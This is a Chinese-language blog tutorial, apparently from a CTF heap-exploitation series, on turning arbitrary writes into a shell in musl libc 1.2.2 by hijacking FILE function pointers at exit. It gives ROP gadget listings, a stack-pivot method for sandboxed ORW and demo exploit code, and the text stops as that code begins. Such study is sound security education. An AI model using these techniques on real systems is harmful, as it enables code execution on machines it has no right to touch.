          <p>在上一篇文章中，我们详细分析了如何通过musl的内存分配系统实现任意两个地址互相写的利用。本文据此讨论应该如何使用这种方式getshell。</p>
<p>首先看到musl中的<code>_IO_FILE</code>结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">	<span class="type">unsigned</span> flags;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *rpos, *rend;</span><br><span class="line">	<span class="type">int</span> (*close)(FILE *);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *wend, *wpos;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *mustbezero_1;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *wbase;</span><br><span class="line">	<span class="type">size_t</span> (*read)(FILE *, <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">	<span class="type">size_t</span> (*write)(FILE *, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">	<span class="type">off_t</span> (*seek)(FILE *, <span class="type">off_t</span>, <span class="type">int</span>);</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *buf;</span><br><span class="line">	<span class="type">size_t</span> buf_size;</span><br><span class="line">	FILE *prev, *next;</span><br><span class="line">	<span class="type">int</span> fd;</span><br><span class="line">	<span class="type">int</span> pipe_pid;</span><br><span class="line">	<span class="type">long</span> lockcount;</span><br><span class="line">	<span class="type">int</span> mode;</span><br><span class="line">	<span class="keyword">volatile</span> <span class="type">int</span> lock;</span><br><span class="line">	<span class="type">int</span> lbf;</span><br><span class="line">	<span class="type">void</span> *cookie;</span><br><span class="line">	<span class="type">off_t</span> off;</span><br><span class="line">	<span class="type">char</span> *getln_buf;</span><br><span class="line">	<span class="type">void</span> *mustbezero_2;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> *shend;</span><br><span class="line">	<span class="type">off_t</span> shlim, shcnt;</span><br><span class="line">	FILE *prev_locked, *next_locked;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> __<span class="title">locale_struct</span> *<span class="title">locale</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中有4个函数指针<code>close</code>、<code>read</code>、<code>write</code>、<code>seek</code>。在解题时，标准输入输出的三个<code>FILE</code>结构体：<code>stdin</code>、<code>stdout</code>、<code>stderr</code>是我们利用的重点。首先我们需要了解musl的exit函数调用链：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">_Noreturn</span> <span class="type">void</span> <span class="title function_">exit</span><span class="params">(<span class="type">int</span> code)</span></span><br><span class="line">&#123;</span><br><span class="line">	__funcs_on_exit();</span><br><span class="line">	__libc_exit_fini();</span><br><span class="line">	__stdio_exit();</span><br><span class="line">	_Exit(code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __stdio_exit(<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">	FILE *f;</span><br><span class="line">	<span class="keyword">for</span> (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);</span><br><span class="line">	close_file(__stdin_used);</span><br><span class="line">	close_file(__stdout_used);</span><br><span class="line">	close_file(__stderr_used);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">close_file</span><span class="params">(FILE *f)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (!f) <span class="keyword">return</span>;</span><br><span class="line">	FFINALLOCK(f);</span><br><span class="line">	<span class="keyword">if</span> (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>exit</code><br />
  <code>__stdio_exit</code><br />
    <code>close_file</code></p>
</blockquote>
<p>可以看到<code>close_file</code>中可能会调用三个<code>FILE</code>的<code>write</code>和<code>seek</code>函数指针。我们要修改的也正是这两个指针。在没有沙箱的情况下，只需要将<code>FILE</code>结构体开头的几个字节修改为<code>/bin/sh</code>，再修改<code>write</code>指针的值为<code>system</code>，以及修改<code>f-&gt;wpos</code>、<code>f-&gt;wbase</code>中其中之一就可以调用到<code>system(&quot;/bin/sh&quot;)</code>。而在有沙箱保护的情况下，还需要通过栈迁移才能进行orw。</p>
<p>由于调用<code>close_file</code>时，<code>rsp</code>周围的栈环境不受我们控制，因此我们不能使用带有<code>pop rsp</code>的gadget。以下是查找带有<code>mov rsp, xxx</code>的gadget：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@colin-virtual-machine:~/Desktop/my_how2heap/musl# ROPgadget --binary /lib/x86_64-linux-musl/libc.so | grep &quot;mov rsp&quot;</span><br><span class="line">0x0000000000076b32 : add byte ptr [rax], al ; sub rdx, 8 ; mov rsp, rdx ; jmp rax</span><br><span class="line">0x0000000000022c22 : add dword ptr [rax], eax ; mov rsp, qword ptr [rbp - 0xc0] ; jmp 0x22750</span><br><span class="line">0x000000000007571b : add eax, dword ptr [rax] ; mov rsp, qword ptr [rbp - 0x448] ; jmp 0x75096</span><br><span class="line">0x000000000004d278 : je 0x4d183 ; mov rsp, r9 ; jmp 0x4d101</span><br><span class="line">0x00000000000789f3 : jg 0x78a1d ; mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]</span><br><span class="line">0x0000000000022c0a : jne 0x22bf0 ; mov rsp, qword ptr [rbp - 0xc0] ; jmp 0x227e2</span><br><span class="line">0x000000000004d259 : lea ebx, [rax + 1] ; mov rsp, r9 ; jmp 0x4d101</span><br><span class="line">0x000000000004d258 : lea r11, [rax + 1] ; mov rsp, r9 ; jmp 0x4d101</span><br><span class="line">0x000000000004d247 : mov eax, 0xffffffff ; mov rsp, r9 ; jmp 0x4d199</span><br><span class="line">0x00000000000789f2 : mov edi, dword ptr [rdi + 0x28] ; mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]</span><br><span class="line">0x00000000000789f1 : mov r15, qword ptr [rdi + 0x28] ; mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]</span><br><span class="line">0x000000000007571d : mov rsp, qword ptr [rbp - 0x448] ; jmp 0x75096</span><br><span class="line">0x0000000000022c24 : mov rsp, qword ptr [rbp - 0xc0] ; jmp 0x22750</span><br><span class="line">0x0000000000022c0c : mov rsp, qword ptr [rbp - 0xc0] ; jmp 0x227e2</span><br><span class="line">0x00000000000789f5 : mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]</span><br><span class="line">0x000000000004d25c : mov rsp, r9 ; jmp 0x4d101</span><br><span class="line">0x000000000004d24c : mov rsp, r9 ; jmp 0x4d199</span><br><span class="line">0x0000000000076b38 : mov rsp, rdx ; jmp rax</span><br><span class="line">0x000000000004d246 : sub byte ptr [rax - 1], bh ; mov rsp, r9 ; jmp 0x4d199</span><br><span class="line">0x0000000000076b35 : sub edx, 8 ; mov rsp, rdx ; jmp rax</span><br><span class="line">0x0000000000076b34 : sub rdx, 8 ; mov rsp, rdx ; jmp rax</span><br></pre></td></tr></table></figure>
<p>其中注意到<code>mov rsp, qword ptr [rdi + 0x30] ; jmp qword ptr [rdi + 0x38]</code>，由于<code>write</code>函数的第一个参数是<code>FILE</code>结构体自身，因此这里的<code>[rdi+0x30]</code>是我们可以通过提前修改控制的值，这样就能够控制<code>rsp</code>的值。同样，后面的<code>[rdi+0x38]</code>可以写入ROP链开头的一个gadget的地址，从而开始执行ROP链。这里注意到<code>[rdi+0x38]</code>当<code>rdi</code>等于<code>FILE</code>结构体地址时，0x38的偏移对应的正好就是<code>wbase</code>，这样可以在满足判断条件的同时写入gadget地址，一举两得。</p>
<p>总结：</p>
<ul>
<li>在无沙箱时，需要修改<code>FILE</code>结构体的3个地方——
<ul>
<li>起始位置写入<code>/bin/sh</code></li>
<li><code>f-&gt;wpos</code>、<code>f-&gt;wbase</code>中其中之一使得二者不等</li>
<li><code>write</code>写入<code>system</code>函数地址。</li>
</ul>
</li>
<li>在有沙箱时，需要修改<code>FILE</code>结构体的3个地方——
<ul>
<li><code>f-&gt;wbase</code>写入第一个gadget地址使得<code>f-&gt;wpos</code>、<code>f-&gt;wbase</code>不等的同时能够执行到gadget</li>
<li><code>write</code>写入刚才提到的栈迁移的gadget</li>
<li>偏移0x30处写入新的栈地址配合栈迁移gadget完成栈迁移</li>
<li>此外还需要在其他地方构造好ROP链用于orw</li>
</ul>
</li>
</ul>
<p>下面笔者编写的demo程序详细演示了两种利用方式的流程，为方便起见，demo中没有通过unlink进行地址写操作，而是直接写。如果使用unlink进行任意地址写，要注意偏移量，两个地址a和b中如果a能够写到b的位置，那么b会写到a+8的位置，对应于两个指针在结构体中的偏移，这一点在上一篇文章中最后打印结果时有体现，不要忽视。</p>
<p>如果执行不成功，请检查自己机器上的musl libc版本是否是1.2.2，若不是，则根据反汇编结果进行偏移量的调整即可。（选择orw模式时需确保当前文件夹中有flag文件）</p>
<p>头文件<code>musl_util.h</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> MY_HOW2HEAP_MUSL_UTIL_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MY_HOW2HEAP_MUSL_UTIL_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *rpos, *rend;</span><br><span class="line">    <span class="type">int</span> (*close)(FILE *);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *wend, *wpos;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *mustbezero_1;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *wbase;</span><br><span class="line">    <span class="type">size_t</span> (*read)(FILE *, <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">    <span class="type">size_t</span> (*write)(FILE *, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *, <span class="type">size_t</span>);</span><br><span class="line">    <span class="type">off_t</span> (*seek)(FILE *, <span class="type">off_t</span>, <span class="type">int</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *buf;</span><br><span class="line">    <span class="type">size_t</span> buf_size;</span><br><span class="line">    FILE *prev, *next;</span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">int</span> pipe_pid;</span><br><span class="line">    <span class="type">long</span> lockcount;</span><br><span class="line">    <span class="type">int</span> mode;</span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> lock;</span><br><span class="line">    <span class="type">int</span> lbf;</span><br><span class="line">    <span class="type">void</span> *cookie;</span><br><span class="line">    <span class="type">off_t</span> off;</span><br><span class="line">    <span class="type">char</span> *getln_buf;</span><br><span class="line">    <span class="type">void</span> *mustbezero_2;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *shend;</span><br><span class="line">    <span class="type">off_t</span> shlim, shcnt;</span><br><span class="line">    FILE *prev_locked, *next_locked;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">locale_struct</span> *<span class="title">locale</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> last_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> freeable:<span class="number">1</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> sizeclass:<span class="number">6</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> maplen:<span class="number">8</span>*<span class="number">8</span><span class="number">-12</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">char</span> pad[<span class="number">0x10</span> - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> storage[];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> check;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span></span><br><span class="line">    <span class="type">int</span> nslots;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLACK       <span class="string">&quot;30&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> RED         <span class="string">&quot;31&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN       <span class="string">&quot;32&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> YELLOW      <span class="string">&quot;33&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BLUE        <span class="string">&quot;34&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PURPLE      <span class="string">&quot;35&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GREEN_DARK  <span class="string">&quot;36&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WHITE       <span class="string">&quot;37&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDEFINED   <span class="string">&quot;-&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HIGHLIGHT   <span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> UNDERLINE   <span class="string">&quot;4&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SPARK       <span class="string">&quot;5&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STR_END      <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">printf_color</span><span class="params">(<span class="type">char</span>* color, <span class="type">char</span>* effect, <span class="type">char</span>* <span class="built_in">string</span>)</span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, <span class="string">&quot;\033[&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(effect[<span class="number">0</span>] != <span class="string">&#x27;-&#x27;</span>)&#123;</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, effect);</span><br><span class="line">        <span class="built_in">strcat</span>(buffer, <span class="string">&quot;;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, color);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="string">&quot;m&quot;</span>);</span><br><span class="line">    <span class="built_in">strcat</span>(buffer, <span class="built_in">string</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span> STR_END, buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Address info starting in %p:\n&quot;</span>, buf);</span><br><span class="line">    <span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">    <span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">        <span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">        <span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">        <span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">        <span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">        output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">                <span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">        output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">        <span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">        index += <span class="number">16</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;---------------------------------------------------------------------------\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//MY_HOW2HEAP_MUSL_UTIL_H</span></span></span><br></pre></td></tr></table></figure>
<p>c文件<code>musl_FSOP.c</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;musl_util.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> get_shell 